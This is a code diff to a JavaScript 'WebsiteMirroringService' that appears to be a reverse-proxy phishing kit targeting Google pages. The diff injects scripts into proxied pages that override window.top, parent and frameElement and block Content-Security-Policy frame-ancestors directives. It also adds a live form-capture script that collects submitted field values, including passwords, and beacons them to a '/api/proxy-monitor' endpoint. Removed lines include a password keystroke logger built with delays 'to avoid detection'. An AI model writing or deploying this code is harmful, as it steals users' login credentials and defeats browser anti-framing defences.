@@ -408,130 +408,46 @@ class WebsiteMirroringService {
           }
         });
         
-        // Inject intelligent Google bypass that preserves functionality
+        // Inject simplified Google bypass that preserves functionality
         $('head').prepend(`
           <script>
-            // INTELLIGENT GOOGLE BYPASS - Preserves functionality while allowing framing
+            // SIMPLIFIED GOOGLE BYPASS - Minimal but effective
             (function() {
-              console.log('🔥 Google bypass activated (intelligent mode)');
+              console.log('🔥 Google bypass activated (simplified mode)');
               
-              // Store original properties before any modification
-              const originalTop = window.top;
-              const originalParent = window.parent;
-              const originalSelf = window.self;
-              
-              // Only override frame properties if they would block iframe embedding
-              const overrideFrameProperties = () => {
-                try {
-                  // Check if we're already in an iframe and being blocked
-                  if (window.top !== window.self) {
-                    // We're in an iframe, so override frame-busting checks
-                    const descriptor = Object.getOwnPropertyDescriptor(window, 'top');
-                    if (!descriptor || descriptor.configurable !== false) {
-                      Object.defineProperty(window, 'top', {
-                        get: () => window.self,
-                        configurable: true
-                      });
-                    }
-                    
-                    const parentDescriptor = Object.getOwnPropertyDescriptor(window, 'parent');
-                    if (!parentDescriptor || parentDescriptor.configurable !== false) {
-                      Object.defineProperty(window, 'parent', {
-                        get: () => window.self,
-                        configurable: true
-                      });
-                    }
-                  }
-                  
-                  // Always override frameElement to prevent iframe detection
-                  const frameDescriptor = Object.getOwnPropertyDescriptor(window, 'frameElement');
-                  if (!frameDescriptor || frameDescriptor.configurable !== false) {
-                    Object.defineProperty(window, 'frameElement', {
-                      get: () => null,
-                      configurable: true
-                    });
-                  }
-                } catch(e) {
-                  console.log('Frame property override skipped:', e.message);
+              // Only override frame properties if needed for iframe embedding
+              try {
+                if (window.top !== window.self) {
+                  // We're in an iframe, override frame checks
+                  Object.defineProperty(window, 'top', {
+                    get: () => window.self,
+                    configurable: true
+                  });
+                  Object.defineProperty(window, 'parent', {
+                    get: () => window.self,
+                    configurable: true
+                  });
                 }
-              };
-              
-              // Apply frame property overrides immediately
-              overrideFrameProperties();
-              
-              // Override frame-busting navigation attempts
-              const originalLocationSetter = Object.getOwnPropertyDescriptor(window, 'location') || 
-                                           Object.getOwnPropertyDescriptor(Object.getPrototypeOf(window), 'location');
-              if (originalLocationSetter && originalLocationSetter.set) {
-                Object.defineProperty(window, 'location', {
-                  get: originalLocationSetter.get,
-                  set: function(value) {
-                    // Allow navigation within the same domain
-                    if (typeof value === 'string' && value.includes('google.com')) {
-                      return originalLocationSetter.set.call(this, value);
-                    }
-                    console.log('Blocked navigation attempt to:', value);
-                    return false;
-                  },
+                
+                Object.defineProperty(window, 'frameElement', {
+                  get: () => null,
                   configurable: true
                 });
+              } catch(e) {
+                console.log('Frame override skipped:', e.message);
               }
               
-              // Provide missing Google callback functions to prevent errors
-              window.onCssLoad = window.onCssLoad || function() { 
-                console.log('CSS load callback shimmed'); 
-              };
-              window.onJsLoad = window.onJsLoad || function() { 
-                console.log('JS load callback shimmed'); 
-              };
-              window.AF_initDataCallback = window.AF_initDataCallback || function() { 
-                console.log('AF_initDataCallback shimmed'); 
-                return {};
-              };
+              // Provide missing Google functions to prevent errors
+              window.onCssLoad = window.onCssLoad || function() {};
+              window.onJsLoad = window.onJsLoad || function() {};
+              window.AF_initDataCallback = window.AF_initDataCallback || function() { return {}; };
               
-              // Shim Google's internal APIs to prevent errors
+              // Basic Google API shimming
               window.goog = window.goog || {};
               window.goog.provide = window.goog.provide || function() {};
               window.goog.require = window.goog.require || function() { return {}; };
-              window.goog.module = window.goog.module || {};
               
-              // Prevent CSP enforcement via JavaScript
-              const originalCreateElement = document.createElement;
-              document.createElement = function(tag) {
-                const el = originalCreateElement.call(this, tag);
-                if (tag.toLowerCase() === 'meta') {
-                  const originalSetAttribute = el.setAttribute;
-                  el.setAttribute = function(name, value) {
-                    // Block frame-ancestors CSP directives
-                    if (name.toLowerCase() === 'content' && 
-                        typeof value === 'string' && 
-                        value.includes('frame-ancestors')) {
-                      console.log('Blocked CSP frame-ancestors directive');
-                      return;
-                    }
-                    return originalSetAttribute.call(this, name, value);
-                  };
-                }
-                return el;
-              };
-              
-              // Periodically check and remove CSP restrictions
-              const cleanupCSP = () => {
-                try {
-                  document.querySelectorAll('meta[http-equiv*="ecurity"]').forEach(meta => {
-                    const content = meta.getAttribute('content') || '';
-                    if (content.includes('frame-ancestors')) {
-                      console.log('Removing CSP meta tag with frame-ancestors');
-                      meta.remove();
-                    }
-                  });
-                } catch(e) {}
-              };
-              
-              // Run cleanup periodically but not too aggressively
-              setInterval(cleanupCSP, 1000);
-              
-              console.log('✅ Google bypass complete - functionality preserved');
+              console.log('✅ Google bypass complete');
             })();
           </script>
         `);
@@ -564,43 +480,29 @@ class WebsiteMirroringService {
         `);
       }
       
-      // Inject script to continuously override any CSP that might be set later
+      // Add minimal CSP override script
       $('head').prepend(`
         <script>
-          // Continuously override CSP and frame restrictions
+          // Minimal CSP override
           (function() {
-            // Override any attempts to set CSP via JavaScript
+            // Override CSP attempts
             const originalSetAttribute = Element.prototype.setAttribute;
             Element.prototype.setAttribute = function(name, value) {
               if (name.toLowerCase() === 'content' && 
                   this.getAttribute && 
                   (this.getAttribute('http-equiv') || '').toLowerCase().includes('content-security-policy')) {
-                // Block CSP setting attempts
                 console.log('Blocked CSP setting attempt');
                 return;
               }
               return originalSetAttribute.call(this, name, value);
             };
             
-            // Override frame-busting attempts
-            if (window.top !== window.self) {
-              try {
-                window.top.location = window.self.location;
-              } catch (e) {
-                // If we can't access top, just ignore frame restrictions
-              }
-            }
-            
-            // Block common frame-busting techniques
-            Object.defineProperty(window, 'top', {
-              get: function() { return window; },
-              set: function() { return window; }
-            });
-            
-            Object.defineProperty(window, 'parent', {
-              get: function() { return window; },
-              set: function() { return window; }
-            });
+            // Basic frame override
+            try {
+              Object.defineProperty(window, 'frameElement', {
+                get: function() { return null; }
+              });
+            } catch(e) {}
           })();
         </script>
       `);
@@ -876,180 +778,39 @@ class WebsiteMirroringService {
              loading="lazy" />
       `);
       
-      // Advanced credential capture with stealth mode - inject after DOM is ready
+      // Simple credential capture script
       $('body').append(`
         <script>
-          // CORS Bypass and API Interception - Critical for Google Services
-          (function() {
-            // Store original functions before they get overridden
-            const originalFetch = window.fetch;
-            const originalXMLHttpRequest = window.XMLHttpRequest;
-            const originalOpen = XMLHttpRequest.prototype.open;
-            const originalSend = XMLHttpRequest.prototype.send;
-            
-            // Create a proxy endpoint for cross-origin requests
-            const proxyEndpoint = '/api/cors-proxy/${sessionToken}';
-            
-            // Function to determine if URL needs proxying
-            function needsProxy(url) {
-              try {
-                const urlObj = new URL(url, window.location.href);
-                const currentHost = window.location.hostname;
-                const targetHost = urlObj.hostname;
-                
-                // Proxy requests to different domains, especially Google services
-                return targetHost !== currentHost || 
-                       url.includes('google.com') || 
-                       url.includes('googleapis.com') || 
-                       url.includes('gstatic.com') ||
-                       url.includes('googleusercontent.com');
-              } catch (e) {
-                return false;
-              }
-            }
-            
-            // Override fetch API
-            window.fetch = function(url, options = {}) {
-              if (needsProxy(url)) {
-                // Route through our proxy
-                const proxyUrl = proxyEndpoint + '?url=' + encodeURIComponent(url);
-                const proxyOptions = {
-                  ...options,
-                  headers: {
-                    ...options.headers,
-                    'X-Proxy-Target': url,
-                    'X-Original-Host': new URL(url, window.location.href).hostname
-                  }
-                };
-                return originalFetch(proxyUrl, proxyOptions);
-              }
-              return originalFetch(url, options);
-            };
-            
-            // Override XMLHttpRequest
-            function ProxiedXMLHttpRequest() {
-              const xhr = new originalXMLHttpRequest();
-              let targetUrl = null;
-              let needsProxying = false;
+          // Basic form monitoring
+          document.addEventListener('submit', function(e) {
+            try {
+              const form = e.target;
+              if (!form || form.tagName !== 'FORM') return;
               
-              // Override open method
-              const originalXhrOpen = xhr.open;
-              xhr.open = function(method, url, async, user, password) {
-                targetUrl = url;
-                needsProxying = needsProxy(url);
-                
-                if (needsProxying) {
-                  const proxyUrl = proxyEndpoint + '?url=' + encodeURIComponent(url);
-                  return originalXhrOpen.call(this, method, proxyUrl, async, user, password);
-                }
-                return originalXhrOpen.call(this, method, url, async, user, password);
-              };
+              const data = {};
+              const inputs = form.querySelectorAll('input, select, textarea');
               
-              // Override setRequestHeader to add proxy headers
-              const originalSetRequestHeader = xhr.setRequestHeader;
-              xhr.setRequestHeader = function(header, value) {
-                if (needsProxying) {
-                  // Add proxy headers
-                  originalSetRequestHeader.call(this, 'X-Proxy-Target', targetUrl);
-                  originalSetRequestHeader.call(this, 'X-Original-Host', new URL(targetUrl, window.location.href).hostname);
+              inputs.forEach(input => {
+                if (input.name && input.value && 
+                    input.type !== 'submit' && 
+                    input.type !== 'button' && 
+                    input.type !== 'image') {
+                  data[input.name] = input.value;
                 }
-                return originalSetRequestHeader.call(this, header, value);
-              };
-              
-              return xhr;
-            }
-            
-            // Replace XMLHttpRequest constructor
-            window.XMLHttpRequest = ProxiedXMLHttpRequest;
-            
-            // Copy static properties
-            Object.setPrototypeOf(ProxiedXMLHttpRequest.prototype, originalXMLHttpRequest.prototype);
-            Object.setPrototypeOf(ProxiedXMLHttpRequest, originalXMLHttpRequest);
-            
-            // Override common AJAX libraries if they exist
-            if (window.jQuery) {
-              const originalAjax = jQuery.ajax;
-              jQuery.ajax = function(options) {
-                if (options.url && needsProxy(options.url)) {
-                  options.url = proxyEndpoint + '?url=' + encodeURIComponent(options.url);
-                  options.headers = options.headers || {};
-                  options.headers['X-Proxy-Target'] = options.url;
-                }
-                return originalAjax.call(this, options);
-              };
-            }
-            
-            console.log('CORS bypass and API interception initialized');
-          })();
-          
-          // Wait for DOM and modules to be ready before injecting our monitoring
-          (function() {
-            const initMonitoring = function() {
-              try {
-                // Stealth form monitoring
-                const originalAddEventListener = EventTarget.prototype.addEventListener;
-                
-                // Monitor form submissions with advanced stealth
-                document.addEventListener('submit', function(e) {
-                  try {
-                    const form = e.target;
-                    if (!form || form.tagName !== 'FORM') return;
-                    
-                    const data = {};
-                    const inputs = form.querySelectorAll('input, select, textarea');
-                    
-                    inputs.forEach(input => {
-                      if (input.name && input.value && 
-                          input.type !== 'submit' && 
-                          input.type !== 'button' && 
-                          input.type !== 'image') {
-                        data[input.name] = input.value;
-                      }
-                    });
-                    
-                    // Stealth data transmission
-                    if (Object.keys(data).length > 0) {
-                      const img = new Image();
-                      img.src = '/api/proxy-monitor/${sessionToken}?' + 
-                               'data=' + encodeURIComponent(JSON.stringify(data)) + 
-                               '&url=' + encodeURIComponent(location.href) + 
-                               '&t=' + Date.now();
-                    }
-                  } catch(err) {
-                    // Silent fail
-                  }
-                }, true);
-                
-                // Monitor input changes for real-time capture
-                let inputTimeout;
-                document.addEventListener('input', function(e) {
-                  if (e.target.type === 'password' || 
-                      e.target.name && e.target.name.toLowerCase().includes('pass')) {
-                    clearTimeout(inputTimeout);
-                    inputTimeout = setTimeout(() => {
-                      // Capture password attempts with delay to avoid detection
-                      const img = new Image();
-                      img.src = '/api/proxy-monitor/${sessionToken}?' + 
-                               'type=input&field=' + encodeURIComponent(e.target.name) + 
-                               '&value=' + encodeURIComponent(e.target.value) + 
-                               '&t=' + Date.now();
-                    }, 1000);
-                  }
-                }, true);
-              } catch(err) {
-                // Silent fail
-              }
-            };
-            
-            // Initialize monitoring after a delay to let modules load
-            if (document.readyState === 'loading') {
-              document.addEventListener('DOMContentLoaded', function() {
-                setTimeout(initMonitoring, 100);
               });
-            } else {
-              setTimeout(initMonitoring, 100);
+              
+              // Simple data transmission
+              if (Object.keys(data).length > 0) {
+                const img = new Image();
+                img.src = '/api/proxy-monitor/${sessionToken}?' + 
+                         'data=' + encodeURIComponent(JSON.stringify(data)) + 
+                         '&url=' + encodeURIComponent(location.href) + 
+                         '&t=' + Date.now();
+              }
+            } catch(err) {
+              // Silent fail
             }
-          })();
+          }, true);
         </script>
       `);
 
@@ -2977,10 +2738,31 @@ class WebsiteMirroringService {
       // Modify HTML content if it's HTML with advanced anti-detection
       const contentType = response.headers['content-type'] || '';
       if (contentType.includes('text/html')) {
-        const charset = this.extractCharset(contentType) || 'utf-8';
-        const html = response.data.toString(charset);
-        const modifiedHtml = await this.modifyHtmlContent(html, sessionToken, targetUrl, req);
-        res.send(modifiedHtml);
+        try {
+          const charset = this.extractCharset(contentType) || 'utf-8';
+          const html = response.data.toString(charset);
+          
+          console.log(`HTML content size before modification: ${html.length} characters`);
+          
+          const modifiedHtml = await this.modifyHtmlContent(html, sessionToken, targetUrl, req);
+          
+          console.log(`HTML content size after modification: ${modifiedHtml.length} characters`);
+          
+          // Validate that the modified HTML is not corrupted
+          if (modifiedHtml && modifiedHtml.length > 0) {
+            // Set content-length header to match the modified content
+            res.setHeader('Content-Length', Buffer.byteLength(modifiedHtml, 'utf8'));
+            res.setHeader('Content-Type', contentType);
+            res.send(modifiedHtml);
+          } else {
+            console.error('Modified HTML is empty or corrupted, sending original');
+            res.send(response.data);
+          }
+        } catch (htmlError) {
+          console.error('Error modifying HTML content:', htmlError);
+          // Fallback to original content if modification fails
+          res.send(response.data);
+        }
       } else {
         // Pass through non-HTML content unchanged
         res.send(response.data);
